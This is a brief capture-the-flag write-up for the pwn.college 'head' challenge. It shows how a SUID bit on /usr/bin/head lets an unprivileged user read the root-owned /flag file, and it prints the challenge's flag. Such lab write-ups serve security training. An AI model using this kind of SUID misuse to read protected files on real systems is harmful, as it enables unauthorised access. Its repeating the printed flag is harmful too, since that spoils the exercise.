# Challenge Name: head
**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/head`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/head
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/head
```

-The `s` in `-rws` indicates it's a SUID binary.
-`head` runs with **root privileges**.

## 🚀 Exploitation

The `head` command displays the first lines of a file. It’s the opposite of tail and is useful when you only care about the top of a file, such as headers, shebangs, or log start times.

```bash
head /flag
```
Output:
```
pwn.college{wFRl8uTsa8LWQMYKnV3ESUVFRyt.ddDNxwSM0IzMyEzW}
```



